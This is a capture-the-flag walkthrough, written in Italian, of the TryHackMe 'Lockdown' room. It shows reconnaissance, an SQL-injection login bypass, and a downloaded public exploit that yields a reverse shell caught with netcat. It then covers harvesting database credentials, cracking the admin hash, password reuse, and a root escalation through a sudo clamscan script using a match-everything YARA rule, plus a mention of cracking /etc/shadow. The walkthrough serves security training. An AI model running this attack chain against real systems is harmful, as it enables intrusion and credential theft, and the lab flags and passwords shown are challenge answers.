
https://tryhackme.com/room/lockdown

```
nmap -Pn -v -O 10.10.140.10
```
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
nmap -sVC -v -p22,80 10.10.140.10
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:77:a3:b3:b2:d3:df:aa:f2:6c:2e:33:9d:f9:5a:3b (RSA)
|   256 7e:9d:a8:21:23:43:90:90:c7:b6:14:e1:3b:32:3c:74 (ECDSA)
|_  256 b5:fd:37:46:03:32:f4:6e:5b:21:2e:37:e5:c8:cb:85 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Coronavirus Contact Tracer
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

proviamo ad accedere all'indirizzo IP sulla porta 80 ma il dominio non è visibile, aggiungiamolo al file hosts
```
nano /etc/hosts
```
```
10.10.140.10   contacttracer.thm
```
diamo uno sguardo su
```
http://contacttracer.thm/login.php
```

eseguiamo una prima enumerazione
```
gobuster dir -u http://contacttracer.thm -w /usr/share/wordlists/dirb/common.txt -t50
```

```
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 322] [--> http://contacttracer.thm/admin/]
/build                (Status: 301) [Size: 322] [--> http://contacttracer.thm/build/]
/classes              (Status: 301) [Size: 324] [--> http://contacttracer.thm/classes/]
/.hta                 (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 282]
/dist                 (Status: 301) [Size: 321] [--> http://contacttracer.thm/dist/]
/.htaccess            (Status: 403) [Size: 282]
/inc                  (Status: 301) [Size: 320] [--> http://contacttracer.thm/inc/]
/index.php            (Status: 200) [Size: 17762]
/libs                 (Status: 301) [Size: 321] [--> http://contacttracer.thm/libs/]
/plugins              (Status: 301) [Size: 324] [--> http://contacttracer.thm/plugins/]
/server-status        (Status: 403) [Size: 282]
/temp                 (Status: 301) [Size: 321] [--> http://contacttracer.thm/temp/]
/uploads              (Status: 301) [Size: 324] [--> http://contacttracer.thm/uploads/]

```
facciamo una seconda enumerazione
```
gobuster dir -u http://contacttracer.thm/admin/ -w /usr/share/wordlists/dirb/common.txt -t50
```
```
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 282]
/.htaccess            (Status: 403) [Size: 282]
/.htpasswd            (Status: 403) [Size: 282]
/city                 (Status: 301) [Size: 327] [--> http://contacttracer.thm/admin/city/]
/inc                  (Status: 301) [Size: 326] [--> http://contacttracer.thm/admin/inc/]
/index.php            (Status: 200) [Size: 21734]
/people               (Status: 301) [Size: 329] [--> http://contacttracer.thm/admin/people/]
/reports              (Status: 301) [Size: 330] [--> http://contacttracer.thm/admin/reports/]
/state                (Status: 301) [Size: 328] [--> http://contacttracer.thm/admin/state/]
/user                 (Status: 301) [Size: 327] [--> http://contacttracer.thm/admin/user/]
/zone                 (Status: 301) [Size: 327] [--> http://contacttracer.thm/admin/zone/]
Progress: 4614 / 4615 (99.98%)

```

```
http://contacttracer.thm/admin/reports/
```

ora che abbiamo dato uno sguardo generale abbiamo visto che ci sono delle directory ma non abbiamo l'autorizzazione per accedervi
torniamo sul pannello di login diamoci uno sguardo con il plugin Wappalyzer
```
http://contacttracer.thm/admin/login.php
```
proviamo ad accedere com un SQLi
```markup
' OR 1=1 -- -
```

Fantastico siamo dentro al pannello di amministrazione, diamo uno sguardo alle varie funzioni e troviamo
come possibile  modo per ottenere una reverse shell l'immissione di un immagine avatar opportunamente modificata

dopo qualche tentativo no riuscito ho provato a cercare una vulnerabilità per 
**CTS-QR (by: [oretnom23](mailto:oretnom23@gmail.com) )** v1.0

ed ho trovato https://www.exploit-db.com/exploits/49604

possiamo scaricare uno script da
```
wget https://lanfran02.github.io/posts/lockdown/exp.py
```


```
python3 -m venv myenv
```

```
source myenv/bin/activate
```

```
pip install requests-toolbelt
```

```bash
python3 exp.py.1 10.10.140.10 10.14.99.134 4444
```

ci mettiamo in ascolto con
```
nc -lvnp 4444
```

accediamo a 
http://contacttracer.thm/login.php
ed otteniamo la revshell
```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
^[[Dconnect to [10.14.99.134] from (UNKNOWN) [10.10.218.1] 54594
Linux ip-10-10-218-1 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 10:58:44 up 5 min,  0 users,  load average: 0.00, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ ls
/bin/sh: 1:ls: not found
$ pwd
/
$ 

```

navigando tra le dir troviamo un file interessante
```bash
cat /var/www/html/classes/DBConnection.php
```
```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /var/www/html/classes/DBConnection.php
<?php
class DBConnection{

    private $host = 'localhost';
    private $username = 'cts';
    private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';
    private $database = 'cts_db';
    
    public $conn;
    
    public function __construct(){

        if (!isset($this->conn)) {
            
            $this->conn = new mysqli($this->host, $this->username, $this->password, $this->database);
            
            if (!$this->conn) {
                echo 'Cannot connect to database server';
                exit;
            }            
        }    
        
    }
    public function __destruct(){
        $this->conn->close();
    }
}
?>$ 

```

le credenziali di una connessione MySQL!
usiamole! (è consigliato stabilizzare prima la shell ottenuta)


```
cd /tmp
```

```bash
mysql -u cts -p
```

```
YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE
```

```bash
show databases;
```

```bash
use cts_db;
```

```bash
 show tables;
```

```bash
select * from users;
```

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| cts_db             |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use cts_db;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql>  show tables;
+------------------+
| Tables_in_cts_db |
+------------------+
| barangay_list    |
| city_list        |
| establishment    |
| people           |
| state_list       |
| system_info      |
| tracks           |
| users            |
+------------------+
8 rows in set (0.00 sec)

mysql> select * from users;
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
| id | firstname    | lastname | username | password                         | avatar                        | last_login | date_added          | date_updated        |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
|  1 | Adminstrator | Admin    | admin    | 3eba6f73c19818c36ba8fea761a3ce6d | uploads/1614302940_avatar.jpg | NULL       | 2021-01-20 14:02:37 | 2021-02-26 10:23:23 |
+----+--------------+----------+----------+----------------------------------+-------------------------------+------------+---------------------+---------------------+
1 row in set (0.00 sec)

mysql> 

```
E ora abbiamo una password crittografata!

usiamo  `crackstation` https://crackstation.net/
ed otteniamo
```bash
sweetpandemonium
```

ora ispezioniamo la dir home per vedere gli utenti presenti
```
ls /home
```
abbiamo 
```
cyrus maxine ssm-user ubuntu
```

proviamo
```
su cyrus
```
immettiamo la password trovata e cerchiamo la flag

```
cd cyrus
cyrus@ip-10-10-218-1:~$ ls
ls
quarantine
testvirus
user.txt
cyrus@ip-10-10-218-1:~$ cat user.txt
cat user.txt
THM{w4c1F5AuUNhHCJRtiGtRqZyp0QJDIbWS}
cyrus@ip-10-10-218-1:~$ 
```

ora bisogna elevare i privilegi

```bash
sudo -l
```
```
cyrus@ip-10-10-218-1:~$ sudo -l
[sudo] password for cyrus: 
Matching Defaults entries for cyrus on ip-10-10-218-1:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cyrus may run the following commands on ip-10-10-218-1:
    (root) /opt/scan/scan.sh

```

leggiamo
```bash
cat /opt/scan/scan.sh
```
```bash
read -p "Enter path: " TARGET

if [[ -e "$TARGET" && -r "$TARGET" ]]
  then
    /usr/bin/clamscan "$TARGET" --copy=/home/cyrus/quarantine
    /bin/chown -R cyrus:cyrus /home/cyrus/quarantine
  else
    echo "Invalid or inaccessible path."
fi
```

Lo script legge il percorso di un file dall'input dell'utente. Se il file esiste ed è leggibile:

- Clamscan analizzerà il file. Se è infetto, il file verrà copiato in /home/cyrus/quarantine
- L'utente per la directory /home/cyrus/quarantine e tutto ciò che contiene verrà modificato in cyrus

Quindi, se potessimo "ingannare" clamscan in modo che segnali un file come infetto, potremmo copiarlo in /home/cyrus/quarantine e leggerlo.

ClamAV si basa sulle firme per riconoscere i file infetti

Aggiungendo regole YARA, possiamo influenzare il modo in cui Clamscan segnalerà i file come infetti

```bash
grep DatabaseDirectory /etc/clamav/freshclam.conf
```
ci restituisce 
`DatabaseDirectory /var/lib/clamav`

```
cat /var/lib/clamav/main.hdb
```
```
69630e4574ec6798239b091cda43dca0:69:EICAR_MD5
```
Contiene una firma per il file EICAR

Creiamo `/var/lib/clamav/myrule.yar`un file con la seguente regola al suo interno:

```
nano /var/lib/clamav/myrule.yar
```
```markup
rule CheckFileSize
{
  strings:
    $abc = "abc"
  condition:
    ($abc or not $abc) and filesize > 0
}
```

Questa regola contrassegnerà qualsiasi file come infetto

ora leggiamo il flag di root da /root/root.txt

```
sudo /opt/scan/scan.sh
```

```
/root/root.txt
```

```
cat /home/cyrus/quarantine/root.txt
```

```
THM{xxxxxxxxxxxxxxxx}
```
con lo steso metodo possiamo anche leggere il file shadow 
decifrare la password usando hashcat
passare all'utente Maxine con la password craccata ed eseguire qualsiasi comando come root tramite sudo

